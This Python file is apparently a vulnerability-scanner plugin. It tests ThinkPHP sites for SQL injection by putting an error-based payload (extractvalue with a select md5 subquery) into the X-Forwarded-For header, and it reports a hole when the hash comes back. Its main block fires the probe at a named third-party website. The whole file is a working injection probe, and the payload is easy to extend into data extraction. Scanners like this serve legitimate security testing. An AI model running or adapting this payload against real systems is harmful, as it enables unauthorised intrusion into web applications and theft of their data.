#!/usr/bin/env python
#-*- coding:utf-8 -*-

def assign(service, arg):
    if service == "thinkphp":
        return True, arg

def audit(arg):
    poc = arg + 'index.php?s=/home/article/view_recent/name/1'
    header = "X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#"
    code, head, res, errcode, _ = curl.curl2(poc,header=header)
    if code==200 and 'e165421110ba03099a1c0393373c5b4' in res:
        security_hole("X-Forwarded-For SQLI:"+poc)

if __name__ == '__main__':
    from dummy import *
    audit(assign('thinkphp', 'http://www.binkanter.com/')[1])